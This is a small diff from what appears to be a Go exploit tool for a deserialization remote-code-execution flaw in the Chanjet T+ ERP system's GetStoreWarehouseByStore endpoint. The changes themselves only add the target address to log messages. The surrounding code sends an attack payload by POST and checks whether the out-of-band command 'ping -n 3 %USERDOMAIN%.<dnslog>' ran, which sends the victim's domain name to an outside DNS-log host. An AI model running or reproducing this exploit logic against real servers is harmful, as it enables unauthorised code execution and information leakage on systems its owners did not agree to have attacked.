@@ -61,7 +61,7 @@ func Tplus_RCE(target string) {
 	defer resp1.Body.Close()
 	body, _ := io.ReadAll(resp1.Body)
 	if resp1.StatusCode == http.StatusOK && strings.Contains(string(body), "archivesId") {
-		config.Right.Printf("[+]存在畅捷通T+ GetStoreWarehouseByStore反序列化漏洞\n")
+		config.Right.Printf("[+]%s存在畅捷通T+ GetStoreWarehouseByStore反序列化漏洞\n", target)
 
 		req2, err2 := http.NewRequest("POST", pocUrl, bytes.NewBuffer([]byte(attackPoc)))
 		if err2 != nil {
@@ -84,7 +84,7 @@ func Tplus_RCE(target string) {
 			config.Right.Printf("[-]ping -n 3 %%USERDOMAIN%%.%s 命令执行失败,请重试或检查服务器通信\n", dnslog)
 		}
 	} else {
-		config.ErrMsg.Printf("[-]不存在畅捷通T+ GetStoreWarehouseByStore反序列化漏洞\n")
+		config.ErrMsg.Printf("[-]%s不存在畅捷通T+ GetStoreWarehouseByStore反序列化漏洞\n", target)
 	}
 
 }
